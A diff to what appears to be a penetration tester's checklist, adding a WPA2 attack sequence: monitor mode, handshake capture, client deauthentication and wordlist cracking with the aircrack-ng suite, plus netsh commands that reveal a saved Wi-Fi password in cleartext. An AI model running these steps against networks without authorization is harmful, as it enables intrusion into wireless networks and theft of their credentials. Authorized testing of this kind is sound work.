@@ -1,8 +1,29 @@
 
 ## Attempt to gain sensitive data, gain access
-[ ] Sniff exposed wireless signals: Airmon-ng
-    command: airmon-ng check kill
-    command: airmon-ng start <adapter>
+[ ] Attacking WPA-2
+iwconfig #check interface
+sudo airmon-ng start wlan0
+iw dev #check for monitor mode
+sudo airodump-ng wlan0mon
+
+# Signal Strength PWR ~-40 is strong, ~-50 is good, higher is worse.
+# WPA2 CCP is what you're targeting
+
+sudo airodump-ng -w capture -c channel --bssid bssid wlan0mon
+
+sudo aireplay-ng --deauth channel -a bssid wlan0mon
+
+# This will capture keys for viewing in Wireshark.  You're looking for the "WPA Key Data"
+# To crack use the following command.
+
+aircrack-ng capture.cap -w <wordlist>
+
+
+[ ] If the client gave you access
+# If you were connected to the Wi-Fi, then you can read the cleartext password using this command with an admin cmdprompt. 
+netsh wlan show profile
+netsh wlan show profile name=\"YourWiFiName\" key=clear 
+
     
 [ ] Check wireless signals encryption
     Encryption cipher
